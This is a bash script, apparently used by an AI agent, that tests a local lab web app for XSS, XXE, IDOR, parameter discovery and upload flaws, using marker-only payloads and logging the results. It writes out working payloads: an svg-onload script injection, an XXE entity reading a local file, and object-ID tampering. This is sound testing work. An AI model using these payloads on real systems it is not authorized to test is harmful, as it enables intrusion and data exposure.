#!/usr/bin/env bash
set -Eeuo pipefail
TARGET="${TARGET:-http://127.0.0.1:18080}"
RUN_ID="source_reviewed_wrapper_wave1_$(date -u +%Y%m%dT%H%M%SZ)"
OUT="$HOME/codex-output/$RUN_ID"
mkdir -p "$OUT/http" "$OUT/xss" "$OUT/xxe" "$OUT/access" "$OUT/upload" "$OUT/params"
OBS="$OUT/observations.jsonl"
SUMMARY="$OUT/summary.md"
: > "$OBS"
json_obs(){ python3 - "$OBS" "$@" <<'PY'
import json,sys,datetime
p=sys.argv[1]
d={'ts':datetime.datetime.now(datetime.UTC).isoformat().replace('+00:00','Z')}
for a in sys.argv[2:]:
    if '=' in a:
        k,v=a.split('=',1); d[k]=v
open(p,'a',encoding='utf-8').write(json.dumps(d,ensure_ascii=False)+'\n')
PY
}
status(){ curl -sS -o /dev/null -w '%{http_code}' --max-time 10 "$1" 2>/dev/null || echo 000; }
PRE=$(status "$TARGET/health")
json_obs category=health name=pre status="$PRE" target="$TARGET"
{
  echo "# Source-reviewed wrapper wave 1"
  echo "target: $TARGET"
  echo "pre_health: $PRE"
  echo
  echo "Sources used as patterns: Exploit-DB acquisition metadata, PayloadsAllTheThings XXE/XSS style, Arjun/Dalfox/XSStrike/jwt_tool workflow concepts. Raw third-party scripts were not executed."
} > "$SUMMARY"

# Login for authenticated workflows.
LOGIN="$OUT/http/login_alice.json"
TOKEN=$(curl -sS --max-time 10 -H 'Content-Type: application/json' -d '{"username":"alice","password":"alicepass"}' "$TARGET/api/login" | tee "$LOGIN" | python3 -c 'import json,sys; print(json.load(sys.stdin).get("token",""))' || true)
json_obs category=auth name=alice_login token_present="$([ -n "$TOKEN" ] && echo yes || echo no)" artifact="$LOGIN"

# Arjun-style bounded parameter discovery: known endpoints, safe parameter candidates only.
echo >> "$SUMMARY"; echo "## Arjun-style parameter discovery" >> "$SUMMARY"
PARAMS=(url q file path id next redirect callback return dest data xml payload payload_b64)
ENDPOINTS=(/fetch /xss-reflect /xxe /deserialize /api/users/1 /api/invoices/1001)
for ep in "${ENDPOINTS[@]}"; do
  base_status=$(status "$TARGET$ep")
  for p in "${PARAMS[@]}"; do
    u="$TARGET$ep?$p=HERMES_PARAM_MARKER"
    s=$(status "$u")
    if [ "$s" != "$base_status" ] || [ "$s" = "200" ]; then
      json_obs category=param endpoint="$ep" param="$p" base_status="$base_status" status="$s" source_pattern="Arjun-style bounded param discovery"
    fi
  done
done

echo "param discovery observations written to observations.jsonl" >> "$SUMMARY"

# Dalfox/XSStrike-style runtime XSS proof: browser execution marker only.
echo >> "$SUMMARY"; echo "## Dalfox/XSStrike-style XSS runtime proof" >> "$SUMMARY"
PAYLOAD=$(python3 - <<'PY'
from urllib.parse import quote
print(quote("</div><svg onload=\"document.body.setAttribute('data-xss2','PATT_DALFOX_XSSTRIKE_MARKER')\"></svg><div>", safe=''))
PY
)
XSS_URL="$TARGET/xss-reflect?q=$PAYLOAD"
DOM="$OUT/xss/dom_svg_onload.txt"
CHROMIUM=$(command -v chromium || command -v chromium-browser || true)
if [ -n "$CHROMIUM" ]; then
  "$CHROMIUM" --headless --disable-gpu --no-sandbox --virtual-time-budget=2500 --dump-dom "$XSS_URL" > "$DOM" 2>"$OUT/xss/chromium.err" || true
else
  curl -sS --max-time 10 "$XSS_URL" > "$DOM" 2>"$OUT/xss/curl.err" || true
fi
XSS_HIT=no
grep -q 'data-xss2="PATT_DALFOX_XSSTRIKE_MARKER"' "$DOM" && XSS_HIT=yes
json_obs category=xss runtime_marker="$XSS_HIT" source_pattern="PayloadsAllTheThings/Dalfox/XSStrike-style svg onload marker" dom="$DOM"
echo "xss runtime marker=$XSS_HIT" >> "$SUMMARY"

# PayloadsAllTheThings-style bounded XXE proof.
echo >> "$SUMMARY"; echo "## PayloadsAllTheThings-style bounded XXE" >> "$SUMMARY"
XXE_FILE="/tmp/hermes_modern_api_xxe_marker.txt"
cat > "$OUT/xxe/patt_classic_safe.xml" <<XML
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM "file://$XXE_FILE">]>
<root>&test;</root>
XML
XXE_RESP="$OUT/xxe/response.json"
XXE_CODE=$(curl -sS --max-time 10 -o "$XXE_RESP" -w '%{http_code}' -H 'Content-Type: application/xml' --data-binary "@$OUT/xxe/patt_classic_safe.xml" "$TARGET/xxe" || echo 000)
XXE_HIT=$(python3 - "$XXE_RESP" <<'PY'
import json,sys
try: print('yes' if json.load(open(sys.argv[1])).get('xxe_marker')=='XXE_SAFE_MARKER_HERMES_LOCAL_LAB' else 'no')
except Exception: print('no')
PY
)
json_obs category=xxe status="$XXE_CODE" marker_found="$XXE_HIT" source_pattern="PayloadsAllTheThings classic XXE adapted to safe marker" request="$OUT/xxe/patt_classic_safe.xml" response="$XXE_RESP"
echo "xxe marker=$XXE_HIT status=$XXE_CODE" >> "$SUMMARY"

# Exploit-DB auth/access pattern: object-id tampering for IDOR.
echo >> "$SUMMARY"; echo "## Exploit-DB auth/access pattern: object ID tampering" >> "$SUMMARY"
if [ -n "$TOKEN" ]; then
  for ep in /api/users/1 /api/users/2 /api/invoices/1001 /api/invoices/2001; do
    out="$OUT/access/$(echo "$ep" | tr '/:' '__').json"
    s=$(curl -sS --max-time 10 -o "$out" -w '%{http_code}' -H "Authorization: Bearer $TOKEN" "$TARGET$ep" || echo 000)
    marker=$(grep -aoE 'PROFILE_MARKER_[A-Z]+|PRIVATE_INVOICE_MARKER' "$out" | tr '\n' ',' | sed 's/,$//' || true)
    json_obs category=access endpoint="$ep" status="$s" marker="$marker" source_pattern="Exploit-DB auth/access ID tampering pattern" artifact="$out"
  done
fi

echo "access observations written" >> "$SUMMARY"

# Exploit-DB upload pattern: marker upload and retrieval, no executable payload.
echo >> "$SUMMARY"; echo "## Exploit-DB upload pattern: marker-only upload/retrieval" >> "$SUMMARY"
if [ -n "$TOKEN" ]; then
  MARKER="EDB_UPLOAD_SAFE_MARKER_$(date -u +%s)"
  UP_BODY="$OUT/upload/upload_response.json"
  UP_CODE=$(printf '%s\n' "$MARKER" | curl -sS --max-time 10 -o "$UP_BODY" -w '%{http_code}' -H "Authorization: Bearer $TOKEN" -H 'X-Filename: edb_marker.txt' -H 'Content-Type: text/plain' --data-binary @- "$TARGET/upload" || echo 000)
  RID=$(python3 - "$UP_BODY" <<'PY'
import json,sys
try: print(json.load(open(sys.argv[1])).get('upload_id',''))
except Exception: print('')
PY
)
  RET_CODE=000; FOUND=no; RET_BODY="$OUT/upload/retrieve.txt"
  if [ -n "$RID" ]; then
    RET_CODE=$(curl -sS --max-time 10 -o "$RET_BODY" -w '%{http_code}' "$TARGET/uploads/$RID" || echo 000)
    grep -q "$MARKER" "$RET_BODY" && FOUND=yes
  fi
  json_obs category=upload status="$UP_CODE" retrieve_status="$RET_CODE" marker_found="$FOUND" upload_id="$RID" source_pattern="Exploit-DB arbitrary upload pattern reduced to marker-only safe workflow" upload_response="$UP_BODY" retrieve="$RET_BODY"
  echo "upload status=$UP_CODE retrieve=$RET_CODE marker=$FOUND" >> "$SUMMARY"
fi

POST=$(status "$TARGET/health")
json_obs category=health name=post status="$POST" target="$TARGET"
echo >> "$SUMMARY"; echo "post_health: $POST" >> "$SUMMARY"
echo "$OUT" > "$HOME/codex-output/latest_source_reviewed_wrapper_wave1.txt"
echo "$OUT"
